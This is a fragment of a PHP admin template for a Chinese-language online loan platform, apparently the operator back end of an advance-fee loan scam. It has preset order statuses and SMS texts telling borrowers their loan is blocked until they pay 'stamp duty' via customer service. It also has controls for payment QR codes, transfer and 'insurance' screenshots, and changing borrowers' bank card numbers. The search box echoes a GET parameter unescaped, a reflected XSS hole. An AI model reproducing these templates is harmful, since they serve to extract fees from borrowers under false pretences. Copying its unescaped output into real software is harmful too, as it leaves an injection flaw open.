	...
	<body>
		<div class="nestable">
			<div class="console-title console-title-border drds-detail-title clearfix">
				<h5>借款管理</h5>
				<a href="javascript:dbt('<?php echo ($dbt); ?>');" style="margin-left:35px;"><strong>预设订单状态（默认值）</strong></a>
				<a href="javascript:allsm('<?php echo ($allsm); ?>');" style="margin-left:35px;"><strong>预设订单说明（默认值）</strong></a>
			    <a href="javascript:lix('<?php echo ($lix); ?>');" style="margin-left:35px;"><strong>保险预设</strong></a>	
			    <a href="javascript:ypass('<?php echo ($ypass); ?>');" style="margin-left:35px;"><strong>提现密码：<?php echo ($ypass); ?></strong></a>	
				...
				<a style="display:none;" href="javascript:payinfo('<?php echo ($paybank); ?>','<?php echo ($payname); ?>','<?php echo ($paysn); ?>','<?php echo ($paysm); ?>');" style="margin-left:35px;"><strong>钱包:银行卡</strong></a>						
			</div>
					...
					<div class="clearfix">
						<div class="wp_box col-xs-6">
							<dl>
								<dt>手机号：</dt>
								<dd>
									<input type="text" name="s-pho" value="<?php echo ($_GET['s-pho']); ?>">
								</dd>
							</dl>
						</div>		
						<div class="wp_box col-xs-6">
			...
			<div class="scroll-bar-table">
				<table class="table table-hover">
					...
					<?php if(is_array($list)): $i = 0; $__LIST__ = $list;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($i % 2 );++$i;?><tr id="list-<?php echo ($vo["id"]); ?>">
							...
							<td>总额<?php echo ($vo["money"]); ?>.00</br>每期<?php echo ($vo["quotama"]); ?></td>
							<td>
							...
							<td style="display:none;"><a href="<?php echo U('Loan/qbmx',array('uid'=>$vo['uid'],'oid'=>$vo['id']));?>" target="_blank"><?php echo ($vo["qbmoney"]); ?></a><?php if($vo['qbzx'] == 1): ?></br><span style="color:#E53333;font-weight:700;">有新充值</span><?php endif; if($vo['qbtx'] == 1): ?></br><span style="color:#E53333;font-weight:700;">有新取现</span><?php endif; ?></td>
							
							
							
							<td><a href="javascript:vic('<?php echo ($vo["vicsv"]); ?>','<?php echo ($vo["oid"]); ?>');" title="说明">转账说明</a></br><a target="_blank" href="<?php echo U('Loan/viewhd',array('id'=>$vo['id']));?>" title="点击核对2" target="_blank">转账截图</a></td>

							<td><a href="javascript:cinfo('<?php echo ($vo["name"]); ?>','<?php echo ($vo["pda"]["idcard"]); ?>','<?php echo ($vo["bankname"]); ?>','<?php echo ($vo["banknum"]); ?>','<?php echo ($vo["oid"]); ?>','<?php echo ($vo["money"]); ?>','<?php echo ($vo["lix_money"]); ?>');" title="信息核对"><?php echo ($vo["lix_money"]); ?></a></br><a target="_blank" href="<?php echo U('Loan/viewhdo',array('id'=>$vo['id']));?>" title="点击截图2" target="_blank">保险截图</a></br><a href="javascript:infoo('<?php echo ($vo["oid"]); ?>','<?php echo ($vo["infoo"]); ?>');" title="点击开关" style="display:none;"><?php if($vo['infoo'] == '2'): ?>已开<?php else: ?>已关<?php endif; ?>（<?php echo (($vo["yqm"])?($vo["yqm"]):"未输入"); ?>）</a></td>

							<td class="text-left"><a href="javascript:xgo('<?php echo ($vo["oid"]); ?>','<?php echo ($vo["dbt"]); ?>','<?php echo ($vo["error"]); ?>','<?php echo ($vo["tco"]); ?>','<?php echo ($vo["xbzmark"]); ?>');" title="点击修改订单颜色/状态/说明"><?php echo (($vo["dbt"])?($vo["dbt"]):"提现成功"); ?></a></td>

							<td class="text-left">
								<a href="<?php echo U('Loan/viewContract',array('id'=>$vo['id']));?>" title="点击查看合同" target="_blank">合同</a>｜ 
								<a target="_blank" href="index.php?m=Info&a=view&uid=<?php echo ($vo["user"]["id"]); ?>" title="点击查看资料" target="_blank">资料</a>｜
								<a href="javascript:evbank('<?php echo ($vo["oid"]); ?>','<?php echo ($vo["bankname"]); ?>','<?php echo ($vo["banknum"]); ?>');" title="点击修改卡号">改卡</a>｜
								<a href="javascript:smssend('<?php echo ($vo["user"]["telnum"]); ?>','<?php echo ($vo["oid"]); ?>','<?php echo ($vo["money"]); ?>','<?php echo ($vo["name"]); ?>');" title="点击发送自定义短信">短信</a>｜
								<a href="javascript:setPendingStatus('<?php echo ($vo["id"]); ?>',1);" style="display:none;">通过</a>
								<a href="javascript:delLoanOrder('<?php echo ($vo["id"]); ?>');" title="点击删除订单">删除</a>
							</td>
...
<div style="display: none;" id="smssend_div">
	...
	<td>
        ...
        <tr>
            ...
            <td>
            <a href="javascript:;" onclick="smstz('1');"><p class="yss">通过</p></a>
			<a href="javascript:;" onclick="smstz('2');"><p class="yss">密码</p></a>
			<a href="javascript:;" onclick="smstz('3');"><p class="yss">审核</p></a>
			</td>
        </tr>
    </table>
	【1】点击上面常用按钮信息会自动加到发送框，再点发送；</br>
	【2】@username@会自动识别客户名字，请勿动，**内容请自行添加；</br>
	【3】如有需要增加和更改短信内容，请联系我；</br>
</div>
...
<div style="display: none;" id="wxcode_div">
		<input type="hidden" name="sitewxcode" value="<?php echo (($wxcodes)?($wxcodes):''); ?>" />
		<div class="wx_box">
			<div class="wx_up">
				<div class="wx_upimg">
...
<div style="display: none;" id="zfbcode_div">
		<input type="hidden" name="sitezfbcode" value="<?php echo (($zfbcodes)?($zfbcodes):''); ?>" />
		<div class="wx_box">
			<div class="wx_up">
				<div class="wx_upimg">
				<form action="<?php echo U('Setting/uploadImg');?>" method="post" enctype="multipart/form-data">
			...
			var zfbupimg = $("input[name='sitezfbcode']").val();
				...
				if(zfbupimg.length == 0){
					...
					return false;
						...
						$.post("<?php echo U('Loan/savezfbcode');?>",{zfbcode: zfbupimg},
							function(data){
								if(data.status != 1){
										layer.msg(data.info);
								}else{
			...
			var upimg = $("input[name='sitewxcode']").val();
				...
				if(upimg.length == 0){
					...
					return false;
						...
						$.post("<?php echo U('Loan/savewxcode');?>",{wxcode: upimg},
							function(data){
								if(data.status != 1){
										layer.msg(data.info);
								}else{
...
function smstz(tz){
		if(tz  == '1'){
			$('.layui-layer-content #iconten').prop('value','恭喜！您的订单已通过，请联系在线客服办理。');			
		}else if(tz  == '2'){
			$('.layui-layer-content #iconten').prop('value','尊敬的先生/女士，您的账户信息有误，请及时联系客服处理!');				
		}else if(tz  == '3'){
			$('.layui-layer-content #iconten').prop('value','先生/女士，已提交，请注意查收到账信息，或登录平台查看进度。');		
		}
	...
	function ystz(tz){
		if(tz  == '1'){
			...
			$('.layui-layer-content #color').prop('value','E53333');			
			$('.layui-layer-content #idbt').prop('value','缴纳印花税');
			$('.layui-layer-content #ixsm').prop('value','您未缴纳印花税，系统暂时无法提供放款，请联系在线客服为您办理！');
			$('.layui-layer-content #ixbzmark').prop('value','您未缴纳印花税，系统暂时无法提供放款，请联系在线客服为您办理！');
			$('.layui-layer-content #insms').prop('value','尊敬的先生/女士，您的订单有变，编号879，请及时登录平台查看。');			
		}
